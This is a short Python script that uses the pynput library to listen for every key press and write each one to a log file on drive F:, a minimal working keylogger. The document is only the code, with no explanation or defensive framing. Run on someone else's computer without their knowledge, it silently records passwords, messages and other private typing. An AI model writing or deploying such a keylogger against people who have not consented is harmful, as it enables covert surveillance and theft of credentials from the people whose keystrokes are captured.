from pynput.keyboard import Key, Listener
import logging

log_dir = "F:/"
logging.basicConfig(filename=(log_dir+"log1.txt"), level=logging.DEBUG, format="%(message)s")

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
